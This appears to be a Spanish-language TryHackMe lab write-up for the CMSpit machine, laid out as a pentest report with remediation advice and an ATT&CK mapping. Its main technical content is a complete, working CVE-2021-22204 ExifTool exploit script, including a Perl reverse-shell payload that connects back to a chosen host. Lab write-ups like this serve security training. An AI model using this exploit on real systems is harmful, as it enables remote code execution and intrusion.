---
title: "Informe Técnico: CMSpit (TryHackMe) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina CMSpit de TryHackMe: reconocimiento, explotacion de vulnerabilidades, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, tryhackme, pentesting
series: "TryHackMe Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_01.png"
---

# Informe Técnico de Seguridad Ofensiva: CMSpit

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-blue?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **CMSpit** de **TryHackMe**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** Explotación web / credenciales por defecto
* **Vector de Elevación de Privilegios:** Abuso de binarios SUID / sudo misconfiguration
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | CMSpit |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Linux |
| **Nivel de Dificultad** | Medium |
| **CVE(s) Involucrados** | Ver detalle en informe |
| **Vector de Entrada** | Explotación web / credenciales por defecto |
| **Mecanismo de Escalada** | Abuso de binarios SUID / sudo misconfiguration |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: Explotación web / credenciales por defecto
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: Abuso de binarios SUID / sudo misconfiguration
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

cockpit

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_01.png)

version

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_02.png)

link 

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_03.png)

exploit cockpit

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_04.png)

users and skidy information

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_05.png)

webflag

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_06.png)

initial access revshell php

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_07.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_08.png)

password de stux and flag db

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_09.png)

user.txt

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_10.png)

search escalate privilege 

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_11.png)

search exploit exiftool

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_12.png)

[exploit-CVE-2021-22204.py](http://exploit-cve-2021-22204.py/)

```powershell
#!/usr/bin/env python3



import base64

import os

import subprocess

import sys



class color:

    red = '\033[91m'

    gold = '\033[93m'

    blue = '\033[36m'

    green = '\033[92m'

    no = '\033[0m'





def help():

    print(r"""UNICORD Exploit for CVE-2021-22204

Usage:

  python3 exploit-CVE-2021-22204.py -c <command>

  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port>

  python3 exploit-CVE-2021-22204.py -c <command> [-i <image.jpg>]

  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port> [-i <image.jpg>]

  python3 exploit-CVE-2021-22204.py -h

Options:

  -c    Custom command mode. Provide command to execute.

  -s    Reverse shell mode. Provide local IP and port.

  -i    Path to custom JPEG image. (Optional)

  -h    Show this help menu.

""")



def exploit(command):

    # Create perl payload

    payload = '(metadata "\\c${' + command + '};")'

    print(color.red + "RUNNING: " + color.blue + "UNICORD Exploit for CVE-2021-22204" + color.no)

    print(color.red + "PAYLOAD: " + color.gold + payload + color.no)

    # Write payload to file

    payloadFile = open('payload', 'w')

    payloadFile.write(payload)

    payloadFile.close()

    # Bzz compress file

    subprocess.run(['bzz', 'payload', 'payload.bzz'])

    # Run djvumake

    subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])

    if '-i' in sys.argv:

        imagePath = sys.argv[sys.argv.index('-i') + 1]

        subprocess.run(['cp', imagePath, './image.jpg', '-n'])

    else:

        # Smallest possible JPEG

        image = b"/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/yQALCAABAAEBAREA/8wABgAQEAX/2gAIAQEAAD8A0s8g/9k="

        # Write smallest possible JPEG image to file

        with open("image.jpg", "wb") as img:

            img.write(base64.decodebytes(image))

    # Write exiftool config to file

    config = (r"""

    %Image::ExifTool::UserDefined = (

    'Image::ExifTool::Exif::Main' => {

        0xc51b => {

            Name => 'HasselbladExif',

            Writable => 'string',

            WriteGroup => 'IFD0',

        },

    },

    );

    1; #end

    """)

    configFile = open('exiftool.config', 'w')

    configFile.write(config)

    configFile.close()

    # Exiftool config for output image

    subprocess.run(['exiftool', '-config', 'exiftool.config', '-HasselbladExif<=exploit.djvu', 'image.jpg', '-overwrite_original_in_place', '-q'])

    # Delete leftover files

    os.remove("payload")

    os.remove("payload.bzz")

    os.remove("exploit.djvu")

    os.remove("exiftool.config")

    # Print results

    print(color.red + "RUNTIME: " + color.green + "DONE - Exploit image written to 'image.jpg'" + color.no + "\n")

    exit()

if __name__ == "__main__":

    args = ['-h', '-c', '-s', '-i']

    if args[0] in sys.argv:

        help()

    elif args[1] in sys.argv and not args[2] in sys.argv:

        exec = sys.argv[sys.argv.index(args[1]) + 1]

        command = "system('{}')".format(exec)

        exploit(command)

    elif args[2] in sys.argv and not args[1] in sys.argv:

        localIP = sys.argv[sys.argv.index(args[2]) + 1]

        localPort = sys.argv[sys.argv.index(args[2]) + 2]

        command = "use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({},inet_aton('{}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};".format(localPort, localIP)

        exploit(command)

    else:

        help()

```

Root.txt

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_13.png)

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (Ver detalle en informe).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Explotación web / credenciales por defecto) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Abuso de binarios SUID / sudo misconfiguration) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
